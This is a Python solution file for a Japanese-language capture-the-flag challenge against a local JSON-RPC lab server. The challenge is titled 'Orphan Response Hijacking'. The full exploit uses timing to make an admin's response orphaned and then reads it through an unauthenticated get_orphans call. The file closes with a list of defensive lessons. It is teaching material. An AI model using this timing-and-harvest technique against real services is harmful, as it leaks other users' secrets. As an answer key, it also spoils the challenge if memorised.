#!/usr/bin/env python3
"""
Challenge 1: Orphan Response Hijacking - 模範解答

【ネタバレ注意】
このファイルは完全な攻撃コードです。
まずは自分で exploit_template.py を完成させてみてください。

【攻撃の仕組み】

1. admin が get_secret を呼ぶ（2秒の遅延付き）
2. admin は 0.3秒で待ちきれずに接続を切断
3. 2秒後、サーバーが admin にレスポンスを返そうとする
4. admin は既に切断しているので送信失敗
5. サーバーはレスポンスを orphan_responses リストに保存
6. 攻撃者（guest）が get_orphans メソッドで orphan を取得
7. orphan の中に admin の秘密情報（FLAG）が含まれている

【脆弱性のポイント】
- orphan_responses がグローバル（全ユーザー共有）
- get_orphans メソッドに認証チェックがない
- 遅延を任意に指定できる（タイミング攻撃が容易）
"""

import json
import socket
import time
import threading
from typing import Any, Dict, Optional


class ExploitClient:
    """攻撃用クライアント"""

    def __init__(self, host: str = "127.0.0.1", port: int = 9999):
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self._next_id = 1

    def connect(self):
        """サーバーに接続"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        print(f"[*] サーバーに接続: {self.host}:{self.port}")

    def close(self):
        """接続を閉じる"""
        if self.sock:
            self.sock.close()
            self.sock = None

    def send_request(self, method: str, params: Dict[str, Any] = None) -> int:
        """リクエストを送信してIDを返す"""
        req_id = self._next_id
        self._next_id += 1

        request = {
            "jsonrpc": "2.0",
            "id": req_id,
            "method": method,
            "params": params or {}
        }

        message = json.dumps(request) + "\n"
        self.sock.sendall(message.encode("utf-8"))
        return req_id

    def recv_response(self, timeout: float = 5.0) -> Optional[Dict[str, Any]]:
        """レスポンスを受信"""
        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(4096)
            if data:
                return json.loads(data.decode("utf-8").strip())
        except socket.timeout:
            return None
        return None

    def request(self, method: str, params: Dict[str, Any] = None,
                timeout: float = 5.0) -> Optional[Dict[str, Any]]:
        """リクエストを送信してレスポンスを受信"""
        self.send_request(method, params)
        return self.recv_response(timeout)


def simulate_admin_activity(delay_before: float = 0.5):
    """
    admin ユーザーの活動をシミュレート

    攻撃シナリオ:
    - admin が自分の秘密情報を取得しようとする
    - サーバーの処理が遅い（または意図的に遅延させられている）
    - admin は待ちきれずに接続を切断
    - レスポンスは orphan として残る
    """
    time.sleep(delay_before)

    admin_client = ExploitClient()
    admin_client.connect()

    # admin としてログイン
    admin_client.request("login", {"username": "admin"})
    print("[Admin] ログイン完了")

    # admin が自分の秘密を取得（2秒の遅延あり）
    print("[Admin] 秘密情報を取得中（2秒の遅延あり）...")
    admin_client.send_request("get_secret", {
        "delay_ms": 2000  # 2秒の遅延
    })

    # admin は 0.3秒しか待たずに切断
    time.sleep(0.3)
    print("[Admin] 待ちきれない！接続切断")
    admin_client.close()


def exploit():
    """
    攻撃を実行

    【攻撃フロー】
    ┌─────────┐          ┌─────────┐          ┌─────────┐
    │ Attacker│          │ Server  │          │  Admin  │
    └────┬────┘          └────┬────┘          └────┬────┘
         │                    │                    │
         │ login(guest)       │                    │
         │───────────────────>│                    │
         │<───────────────────│                    │
         │                    │    login(admin)    │
         │                    │<───────────────────│
         │                    │───────────────────>│
         │                    │                    │
         │                    │ get_secret(2000ms) │
         │                    │<───────────────────│
         │                    │                    │
         │                    │   (処理中...)      │
         │                    │                    │
         │                    │    [300ms後]       │
         │                    │    X 接続切断 X    │
         │                    │                    │
         │   [2000ms後]       │                    │
         │                    │───X レスポンス送信失敗
         │                    │                    │
         │                    │ → orphan に保存    │
         │                    │                    │
         │ get_orphans()      │                    │
         │───────────────────>│                    │
         │<───────────────────│                    │
         │                    │                    │
         │ FLAG取得！         │                    │
         │                    │                    │
    """
    print("=" * 60)
    print("Challenge 1: Orphan Response Hijacking - 模範解答")
    print("=" * 60)
    print()

    # 攻撃者クライアント
    attacker = ExploitClient()
    attacker.connect()

    # ステップ1: guest としてログイン
    print("[*] ステップ1: guest としてログイン")
    resp = attacker.request("login", {"username": "guest"})
    if resp and resp.get("result", {}).get("success"):
        print("[+] ログイン成功")
    else:
        print("[-] ログイン失敗")
        return

    # ステップ2: admin の活動をシミュレート
    print()
    print("[*] ステップ2: admin の活動をトリガー")
    admin_thread = threading.Thread(target=simulate_admin_activity)
    admin_thread.start()

    # ステップ3: admin がタイムアウトするのを待つ
    print()
    print("[*] ステップ3: orphan が発生するのを待機中...")

    # 【解答】admin の遅延（2秒）より長く待つ
    wait_time = 2.5
    time.sleep(wait_time)

    # ステップ4: orphan response を取得
    print()
    print("[*] ステップ4: orphan response を取得")

    # 【解答】get_orphans メソッドを呼び出す
    resp = attacker.request("get_orphans", {})

    if resp is None:
        print("[-] レスポンスなし")
        attacker.close()
        admin_thread.join()
        return

    # ステップ5: FLAG を抽出
    print()
    print("[*] ステップ5: FLAG を抽出")

    # 【解答】レスポンスから orphans を取得
    orphans = resp.get("result", {}).get("orphans", [])
    print(f"[*] 取得した orphan 数: {len(orphans)}")

    # 【解答】orphans から FLAG を抽出
    flag = None
    for orphan in orphans:
        result = orphan.get("result", {})
        if result.get("user") == "admin":
            flag = result.get("secret")
            break

    if flag:
        print()
        print("=" * 60)
        print(f"[+] FLAG 発見: {flag}")
        print("=" * 60)
        print()
        print("おめでとうございます！攻撃成功です。")
        print()
        print("【学んだこと】")
        print("1. orphan response を保存すると情報漏洩のリスクがある")
        print("2. タイミング攻撃で意図的に orphan を発生させられる")
        print("3. 対策: orphan は保存せず破棄する、暗号論的乱数IDを使う")
    else:
        print("[-] FLAG が見つかりませんでした")
        print("[*] タイミングの問題かもしれません。もう一度試してください。")

    admin_thread.join()
    attacker.close()


if __name__ == "__main__":
    exploit()
